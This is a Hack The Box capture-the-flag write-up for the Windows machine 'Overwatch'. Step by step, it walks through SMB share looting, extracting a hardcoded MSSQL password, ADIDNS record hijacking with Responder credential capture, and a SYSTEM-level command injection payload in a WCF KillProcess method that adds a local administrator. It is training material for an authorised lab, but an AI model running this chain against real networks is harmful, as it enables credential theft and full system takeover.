# Hack The Box — Overwatch Writeup

## Target

```text
Machine: Overwatch
OS: Windows
Target IP: 10.129.4.131
Domain: overwatch.htb
Hostname: S200401.overwatch.htb
````

---

## 1. Host Configuration

The target was added to `/etc/hosts` to make domain-based tooling work properly.

```bash
echo "10.129.4.131 overwatch.htb S200401.overwatch.htb S200401" | sudo tee -a /etc/hosts
```

Verification:

```bash
grep -i overwatch /etc/hosts
```

Expected result:

```text
10.129.4.131 overwatch.htb S200401.overwatch.htb S200401
```

---

## 2. SMB Enumeration

SMB was checked with NetExec.

```bash
nxc smb 10.129.4.131 -u guest -p '' --shares
```

A readable share named `software$` was discovered.

The share was downloaded locally:

```bash
mkdir -p ~/htb_labs/overwatch/loot/software
cd ~/htb_labs/overwatch/loot/software

smbclient //10.129.4.131/software$ -U 'guest%' -c 'recurse ON; prompt OFF; mget *'
```

The downloaded files were listed:

```bash
find . -type f -ls
```

The interesting file was:

```text
./Monitoring/overwatch.exe
```

---

## 3. Extracting Hardcoded MSSQL Credentials

Initial attempts using normal ASCII strings did not reveal the password:

```bash
strings -a ./Monitoring/overwatch.exe | grep -iA3 -B3 "SecurityLogs"
strings -a ./Monitoring/overwatch.exe | grep -iA3 -B3 "password"
strings -a ./Monitoring/overwatch.exe | grep -iA3 -B3 "sqlsvc"
```

These returned no useful results.

The reason was that the relevant string was stored as UTF-16 little-endian inside the `.NET` binary.

The correct command was:

```bash
strings -el ./Monitoring/overwatch.exe | grep -iA3 -B3 "SecurityLogs"
```

This revealed the MSSQL connection string:

```text
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
```

Credentials recovered:

```text
Username: sqlsvc
Password: TI0LKcfHzZw1Vv
```

---

## 4. MSSQL Access

The credentials were validated against MSSQL on port `6520`.

```bash
nxc mssql 10.129.4.131 --port 6520 -u sqlsvc -p 'TI0LKcfHzZw1Vv'
```

Result:

```text
[+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
```

The MSSQL service was then accessed using Impacket:

```bash
impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@S200401.overwatch.htb' -p 6520 -windows-auth
```

Inside the MSSQL shell, basic enumeration was performed:

```sql
select @@version;
select system_user;
select user_name();
enum_db
enum_links
```

The database context showed that the authenticated user was `OVERWATCH\sqlsvc`, but the current database user was `guest`.

```text
system_user: OVERWATCH\sqlsvc
user_name(): guest
```

The available databases included:

```text
master
tempdb
model
msdb
overwatch
```

Linked server enumeration showed a linked server named `SQL07`.

```text
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE
------------------   ----------------   -----------   ------------------
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS
SQL07                SQLNCLI            SQL Server    SQL07
```

Attempting to use the linked server failed:

```sql
use_link SQL07
```

Result:

```text
OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
Named Pipes Provider: Could not open a connection to SQL Server [64].
```

This indicated that the server `SQL07` could not be reached or resolved properly.

---

## 5. ADIDNS Abuse to Hijack SQL07

The account `sqlsvc` had enough rights to create a DNS record inside the AD-integrated DNS zone.

Because the linked server attempted to connect to `SQL07`, a fake DNS record was created to point `SQL07` to the attacker machine.

Attacker IP:

```text
10.10.14.161
```

The DNS record was added with `bloodyAD`:

```bash
bloodyAD --host S200401.overwatch.htb \
  -d overwatch.htb \
  -u sqlsvc \
  -p 'TI0LKcfHzZw1Vv' \
  add dnsRecord SQL07 10.10.14.161
```

The record was verified:

```bash
nslookup SQL07.overwatch.htb 10.129.4.131
```

Expected result:

```text
Name:    SQL07.overwatch.htb
Address: 10.10.14.161
```

---

## 6. Capturing SQL Credentials with Responder

Responder was started on the HTB VPN interface:

```bash
sudo responder -I tun0
```

Then the linked server connection was triggered again from the MSSQL shell:

```sql
use_link SQL07
```

This time, the target attempted to authenticate to the attacker-controlled fake `SQL07` host.

Responder captured cleartext MSSQL credentials:

```text
[MSSQL] Received connection from 10.129.4.131
[MSSQL] Cleartext Client   : 10.129.4.131
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

Credentials recovered:

```text
Username: sqlmgmt
Password: bIhBbzMMnB82yx
```

The MSSQL shell returned a connection failure, but this was expected because the purpose was only to force authentication to the attacker machine.

```text
Communication link failure
An existing connection was forcibly closed by the remote host.
```

---

## 7. WinRM Access as sqlmgmt

The newly captured credentials were tested against WinRM:

```bash
nxc winrm 10.129.4.131 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

Then an interactive shell was opened:

```bash
evil-winrm -i 10.129.4.131 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

Basic checks:

```powershell
whoami
hostname
whoami /groups
```

At this stage, access was obtained as:

```text
overwatch\sqlmgmt
```

---

## 8. Local Service Enumeration

A local service was listening on port `8000`.

```powershell
netstat -ano | findstr :8000
```

The service exposed a WCF endpoint:

```powershell
iwr 'http://localhost:8000/MonitorService?wsdl' -UseBasicParsing
```

The service was reachable locally at:

```text
http://localhost:8000/MonitorService?wsdl
```

A PowerShell web service proxy was created:

```powershell
$proxy = New-WebServiceProxy -Uri "http://localhost:8000/MonitorService?wsdl" -Namespace "WcfProxy"
```

The vulnerable method was:

```powershell
KillProcess()
```

---

## 9. Command Injection in KillProcess

The `KillProcess` method was vulnerable to command injection.

A simple command execution test was performed:

```powershell
$proxy.KillProcess('x; whoami; #')
```

The result showed code execution as SYSTEM:

```text
nt authority\system
```

This confirmed privilege escalation.

---

## 10. Privilege Escalation to Local Administrator

The `sqlmgmt` user was added to the local Administrators group using the SYSTEM-level command injection:

```powershell
$proxy.KillProcess('x; net localgroup administrators sqlmgmt /add; #')
```

The command completed successfully.

A new Evil-WinRM session was opened:

```bash
evil-winrm -i 10.129.4.131 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

Group membership was verified:

```powershell
whoami /groups
```

The user was now a member of:

```text
BUILTIN\Administrators
```
---

# Attack Chain Summary

```text
Readable SMB share software$
        ↓
Downloaded Monitoring/overwatch.exe
        ↓
Extracted UTF-16 LE connection string with strings -el
        ↓
Recovered MSSQL credentials for sqlsvc
        ↓
Authenticated to MSSQL on port 6520
        ↓
Discovered linked server SQL07
        ↓
SQL07 failed to resolve/connect
        ↓
Created ADIDNS record SQL07 → attacker IP
        ↓
Triggered linked server authentication
        ↓
Responder captured cleartext sqlmgmt credentials
        ↓
WinRM access as sqlmgmt
        ↓
Local WCF service on port 8000
        ↓
KillProcess command injection
        ↓
SYSTEM command execution
        ↓
Added sqlmgmt to local Administrators
        ↓
Read Administrator root flag
```
